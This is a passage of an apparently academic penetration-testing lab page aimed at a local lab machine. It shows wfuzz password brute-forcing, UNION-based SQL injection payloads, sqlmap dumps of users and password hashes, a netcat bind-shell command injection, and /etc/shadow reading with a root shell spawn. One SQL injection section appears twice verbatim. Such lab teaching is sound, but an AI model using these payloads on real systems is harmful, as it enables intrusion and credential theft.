<strong><code class="docutils literal notranslate"><span class="pre">wfuzz</span> <span class="pre">-w</span> <span class="pre">&lt;dicPath&gt;</span> <span class="pre">&quot;URL&quot;</span></code></strong></p><div class="line-block">
<div class="line">We suggest using <code class="docutils literal notranslate"><span class="pre">wfuzz</span></code> to perform a dictionary attack.</div>
<div class="line">A good dictionary can be found at</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">/usr/share/wfuzz/wordlist/others/common_pass.txt</span></code></strong></p><div class="line-block">
<div class="line">We should also replace the URL like:</div>
</div>
<p class="centered">
<strong><a class="reference external" href="http://172.17.0.2/gallery.php">http://172.17.0.2/gallery.php</a>?password=FUZZ&amp;Login=Login#</strong></p><div class="line-block">
<div class="line">Now, observe the output of <code class="docutils literal notranslate"><span class="pre">wfuzz</span></code>, it will give you the HTTP return
code (normally <code class="docutils literal notranslate"><span class="pre">200/OK</span></code>) and the number of characters, lines and
words on the page it received while trying that password. <em>The
“Incorrect Password” page contains 10 Lines and 37 Words</em>. Look if one
line is different, meaning that that password has got a different
result. Try that password on the website.</div>
</div>
<div class="collapse tp1_s" id="tp1_2_1"><a class="sol-img reference internal image-reference" href="../_images/1.png"><img alt="../_images/1.png" class="sol-img align-center" src="../_images/1.png" style="width: 315.7px; height: 102.89999999999999px;" /></a>
</div><?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  //'getSolution("../_images/1.png","bruteforcing-wfuzz");',
                  'updateSol("tp1_2_1","#tp1_2_1","bruteforcing-wfuzz");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="sql-injection-sqlmap">
<h3>SQL Injection - <code class="docutils literal notranslate"><span class="pre">SQLMap</span></code><a class="headerlink" href="#sql-injection-sqlmap" title="Permalink to this headline">¶</a></h3>
<p>Imagine you can interact with a database such that:</p>
<div class="collapse tp1_s3" id="tp1_3_1"><a class="sol-img reference internal image-reference" href="../_images/2.png"><img alt="../_images/2.png" class="sol-img align-center" src="../_images/2.png" style="width: 170.0px; height: 166.0px;" /></a>
</div><ul>
<li><p class="first">Now think about the SQL Query that must be executed to look into that
database. When you have a clear idea, look at the next line.</p>
</li>
<li><p class="first">The query used is most likely something like
<code class="docutils literal notranslate"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=PARAM&quot;</span></code>.</p>
</li>
<li><div class="first line-block">
<div class="line">SQL commands support operators like AND or OR. Try to use a OR to
dump the content of the whole table. When you’re done read the next
line. Using a OR you can dump the whole table by using the query
<code class="docutils literal notranslate"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=1</span> <span class="pre">OR</span> <span class="pre">1=1&quot;</span></code> (see picture just above)</div>
<div class="line">This query works because the OR condition is always true, so every
entry in the database is selected and returned.</div>
</div>
</li>
<li><p class="first">Now that we know that we can inject commands, we can try some more
interesting commands like <code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">OR</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">user()</span> <span class="pre">#&quot;</span></code>.
This command will give you the username used to connect to the
database.</p>
</li>
<li><p class="first">Now we would like to know if some information about our cats are
hidden. For instance, their microchip is probably there but hidden.
Let’s see if we can display it.</p>
</li>
<li><p class="first">First, let’s find the name of the table used to store our cats.
“cats” is probably a good guess but let’s check it by using
<code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">table_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.tables</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">LIKE</span> <span class="pre">'cats%'#&quot;</span></code>
as an input.</p>
</li>
<li><p class="first">The answer should show you “cats” next to the birth date, meaning
that a table cats exists (you can try with other names)</p>
</li>
<li><p class="first">Now that we’re sure that our table is called “cats” let’s try to find
the name of the rows by using the input
<code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">concat(table_name,0x0a,column_name)</span> <span class="pre">FROM</span> <span class="pre">information_schema.columns</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'cats'</span> <span class="pre">#&quot;</span></code>.
The result of this command will show you that this table has 4 rows:
<code class="docutils literal notranslate"><span class="pre">id,</span> <span class="pre">name,</span> <span class="pre">birth_date</span></code> and <code class="docutils literal notranslate"><span class="pre">chip</span></code>. Great our chip <code class="docutils literal notranslate"><span class="pre">id</span></code> is here
and called <code class="docutils literal notranslate"><span class="pre">chip</span></code>.</p>
</li>
</ul>
<div class="line-block">
<div class="line">As we’ve seen, an SQL Injection allow to read data we aren’t supposed
to read. But what’s interesting is if the user used by the website has
admin privileges, we could even try to read the informations about
other databases or SQL users. But these queries are pretty complex, so
let’s use a tool for that.</div>
</div>
<div class="line-block">
<div class="line">SQLMap is a tool that will perform SQL injections for you, so let’s
try it. Run sqlmap with the command:</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--users</span> <span class="pre">--password</span></code></strong></p><p>SQLMap will first scan the database for injectable parameters. Then, it
will extract (if possible) a list of the users and their hashed
password. Upon success, sqlmap will try a bruteforce attack on the
hashed passwords it extracted. When done, sqlmap should show you the
login and passwords of several SQL users, write them</p>
<ul>
<li><p class="first">Now think about the SQL Query that must be executed to look into that
database. When you have a clear idea, look at the next line.</p>
</li>
<li><p class="first">The query used is most likely something like
<code class="docutils literal notranslate"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=PARAM&quot;</span></code>.</p>
</li>
<li><div class="first line-block">
<div class="line">SQL commands support operators like AND or OR. Try to use a OR to
dump the content of the whole table. When you’re done read the next
line. Using a OR you can dump the whole table by using the query
<code class="docutils literal notranslate"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=1</span> <span class="pre">OR</span> <span class="pre">1=1&quot;</span></code> (see picture just above)</div>
<div class="line">This query works because the OR condition is always true, so every
entry in the database is selected and returned.</div>
</div>
</li>
<li><p class="first">Now that we know that we can inject commands, we can try some more
interesting commands like <code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">OR</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">user()</span> <span class="pre">#&quot;</span></code>.
This command will give you the username used to connect to the
database.</p>
</li>
<li><p class="first">Now we would like to know if some information about our cats are
hidden. For instance, their microchip is probably there but hidden.
Let’s see if we can display it.</p>
</li>
<li><p class="first">First, let’s find the name of the table used to store our cats.
“cats” is probably a good guess but let’s check it by using
<code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">table_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.tables</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">LIKE</span> <span class="pre">'cats%'#&quot;</span></code>
as an input.</p>
</li>
<li><p class="first">The answer should show you “cats” next to the birth date, meaning
that a table cats exists (you can try with other names)</p>
</li>
<li><p class="first">Now that we’re sure that our table is called “cats” let’s try to find
the name of the rows by using the input
<code class="docutils literal notranslate"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">concat(table_name,0x0a,column_name)</span> <span class="pre">FROM</span> <span class="pre">information_schema.columns</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'cats'</span> <span class="pre">#&quot;</span></code>.
The result of this command will show you that this table has 4 rows:
<code class="docutils literal notranslate"><span class="pre">id,</span> <span class="pre">name,</span> <span class="pre">birth_date</span></code> and <code class="docutils literal notranslate"><span class="pre">chip</span></code>. Great our chip <code class="docutils literal notranslate"><span class="pre">id</span></code> is here
and called <code class="docutils literal notranslate"><span class="pre">chip</span></code>.</p>
</li>
</ul>
<div class="line-block">
<div class="line">As we’ve seen, an SQL Injection allow to read data we aren’t supposed
to read. But what’s interesting is if the user used by the website has
admin privileges, we could even try to read the informations about
other databases or SQL users. But these queries are pretty complex, so
let’s use a tool for that.</div>
</div>
<div class="line-block">
<div class="line">SQLMap is a tool that will perform SQL injections for you, so let’s
try it. Run sqlmap with the command:</div>
</div>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--users</span> <span class="pre">--password</span></code></strong></p><p>SQLMap will first scan the database for injectable parameters. Then, it
will extract (if possible) a list of the users and their hashed
password. Upon success, sqlmap will try a bruteforce attack on the
hashed passwords it extracted. When done, sqlmap should show you the
login and passwords of several SQL users, write them done this could be
useful.</p>
<div class="collapse tp1_s3" id="tp1_3_2"><a class="sol-img reference internal image-reference" href="../_images/5.PNG"><img alt="../_images/5.PNG" class="sol-img align-center" src="../_images/5.PNG" style="width: 392.5px; height: 165.0px;" /></a>
</div><p>You can also have the list of all databases with:</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--dbs</span></code></strong></p><p>One is called phpmyadmin? That’s interesting. PHPMyadmin is a tool to
manager SQL databases. Try the URL <a class="reference external" href="http://172.17.0.2/phpmyadmin/">http://172.17.0.2/phpmyadmin/</a> and try
the admin password you found previously. You should have access to all
the databases and their content.</p>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  //'getSolution("../_images/2.png","sql-injection-sqlmap");',
                  //'getSolution("../_images/5.PNG","sql-injection-sqlmap");',
                  'updateSol("tp1_3_1 tp1_3_2",".tp1_s3","sql-injection-sqlmap");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
<div class="section" id="command-injection-metasploit">
<h3>Command Injection - <code class="docutils literal notranslate"><span class="pre">Metasploit</span></code><a class="headerlink" href="#command-injection-metasploit" title="Permalink to this headline">¶</a></h3>
<div class="line-block">
<div class="line">Is it possible to make this website run another command? Think about
it and about how bash works and try it. When you’re done, go to the
next line. An interesting thing about bash, is that you can “chain”
commands by using the character “;”. For instance, of you type echo
“hello”; echo “world” in your terminal, it will execute echo “hello”
first and then echo “world”.</div>
</div>
<div class="line-block">
<div class="line">It would be easier to have a bash terminal right? We can do that!</div>
</div>
<p>Let’s try to open a netcat on the machine so we can directly connect to
it. For that use this input</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">8.8.8.8;</span> <span class="pre">mkfifo</span> <span class="pre">/tmp/pipe;sh</span> <span class="pre">/tmp/pipe</span> <span class="pre">|</span> <span class="pre">nc</span> <span class="pre">-l</span> <span class="pre">-p</span> <span class="pre">1234</span> <span class="pre">&gt;</span> <span class="pre">/tmp/pipe</span></code>.</strong></p><p>This command is a bit complicated, but we basically tell netcat (nc) to
listen on the port 1234 for a TCP connection, and we will communicate
with a named pipe so the traffic can go both ways.</p>
<div class="collapse tp1_s4" id="tp1_4_1"><a class="sol-img reference internal image-reference" href="../_images/3.png"><img alt="../_images/3.png" class="sol-img align-center" src="../_images/3.png" style="width: 302.0px; height: 231.5px;" /></a>
</div><p>In the terminal open Metasploit by typing <code class="docutils literal notranslate"><span class="pre">msfconsole</span></code>. Type use
<code class="docutils literal notranslate"><span class="pre">multi/handler</span></code>.</p>
<div class="collapse tp1_s4" id="tp1_4_2"><a class="sol-img reference internal image-reference" href="../_images/71.PNG"><img alt="../_images/71.PNG" class="sol-img align-center" src="../_images/71.PNG" style="width: 418.0px; height: 197.0px;" /></a>
</div><p>An interesting command would be the command to look into the users of
the system (whoami -&gt; user -&gt; apache2). In Linux, the users are stored
in <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code>. If you look closely, there’s a user called “site”.
Did we already see this username before? (for this example).</p>
<p>Type <code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">site&#64;172.17.0.2</span></code> and use the preceding password found with
SQLMap</p>
<div class="collapse tp1_s4" id="tp1_4_3"><a class="sol-img reference internal image-reference" href="../_images/81.PNG"><img alt="../_images/81.PNG" class="sol-img align-center" src="../_images/81.PNG" style="width: 346.5px; height: 120.0px;" /></a>
</div><div class="line-block">
<div class="line">Being a user is cool, but couldn’t we go further and try to become root ? In
Linux, <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> contains the users, <code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> contains
the hashed passwords and you can’t access <code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> unless
you’re root.</div>
</div>
<div class="line-block">
<div class="line">Python is often allowed to run as root, and it’s a very bad practice:</div>
</div>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">/usr/sbin/john</span></code> is an utility that bruteforce password files</li>
<li><code class="docutils literal notranslate"><span class="pre">/usr/sbin/unshadow</span></code> is a commands that merges the result of
<code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code> and <code class="docutils literal notranslate"><span class="pre">/etc/shadow</span></code> to put them in a format readable
by john</li>
</ul>
<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;cat /etc/shadow&#39;</span><span class="p">)</span>
</pre></div>
</div>
<p>Or</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</span>
</pre></div>
</div>
<?php
      if($good) {
         //nothing
      } else {
         echo '<script type="text/javascript">',
                  'updateSol("tp1_4_1 tp1_4_2 tp1_4_3",".tp1_s4","command-injection-metasploit");',
                  //'getSolution("../_images/3.png","command-injection-metasploit");',
                  //'getSolution("../_images/7.PNG","command-injection-metasploit");',
                  //'getSolution("../_images/8.PNG","command-injection-metasploit");',
               '</script>';
         include "../_static/solution.html";
      }
?></div>
</div>
<div class="section" id="bonus-going-beyond">
<h2>Bonus: going beyond<a class="headerlink" href="#bonus-going-beyond" title="Permalink to this headline">¶</a></h2>
<p>Using another metasploitable VM as server (i.e a VM designed to be
vulnerable) with some port opened and vulnerable version of services,
try to reproduce the preceding exploits and even more if you can. Look
on the internet for vulnerability for the different opened services, or
search with <code class="docutils literal notranslate"><span class="pre">msfconsole</span></code>.</p>
<p class="centered">
<strong><code class="docutils literal notranslate"><span class="pre">msf</span> <span class="pre">&gt;</span> <span class="pre">search</span> <span class="pre">&lt;exploit_service&gt;</span></code></strong></p><p>You can find a metasploitable VM here:</p>
<p class="centered">
<strong><a class="reference external" href="https://docs.rapid7.com/metasploit/metasploitable-2/">https://docs.rapid7.com/metasploit/metasploitable-2/</a></strong></p><p>It’s time to play, try to discover all the possibilities that <code class="docutils literal notranslate"><span class="pre">nmap</span></code>
or other scanning tools have to propose. Search for common vulnerability
and how to exploit them !</p>
</div>
</div>


    </div>
      
  </div>
</div>
<footer class="footer">
  <div class="container">
    <p class="pull-right">
      <a id="up" href="#">
        <span class="fa fa-chevron-up"></span>
      </a>
      
        <br/>
        
      
    </p>
    <p>
        &copy; Copyright 2022, Legay Axel, Duchene Fabien, Crochet Christophe, Sebastien Strebelle, Thomas Given-Wilson, Schmitz Donatien.<br/>
      Created using <a href="http://sphinx-doc.org/">Sphinx</a> 1.8.5.<br/>
    </p>
  </div>
</footer>
  </body>
</html>